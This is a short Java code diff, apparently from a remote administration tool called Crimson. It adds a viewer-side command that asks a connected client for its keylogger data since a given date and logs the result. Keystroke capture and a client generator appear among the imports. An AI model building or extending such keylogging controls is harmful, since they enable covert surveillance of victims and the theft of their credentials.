@@ -32,6 +32,7 @@ import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
+import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
 import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
 import com.subterranean_security.crimson.core.proto.Listener.RQ_AddListener;
 import com.subterranean_security.crimson.core.proto.Login.RQ_Login;
@@ -305,7 +306,22 @@ public enum ViewerCommands {
 		}
 		return list;
 	}
-	
-	
+
+	public static void trigger_key_update(int cid, Date target) {
+		log.debug("Triggering keylog update");
+		try {
+			Message m = ViewerRouter.routeAndWait(
+					Message.newBuilder().setId(IDGen.get()).setRqKeyUpdate(
+							RQ_KeyUpdate.newBuilder().setCid(cid).setStartDate(target == null ? 0 : target.getTime())),
+					30);
+			if (m != null) {
+				log.debug("Update result: " + m.getRsKeyUpdate().getResult());
+			}
+
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
 
 }
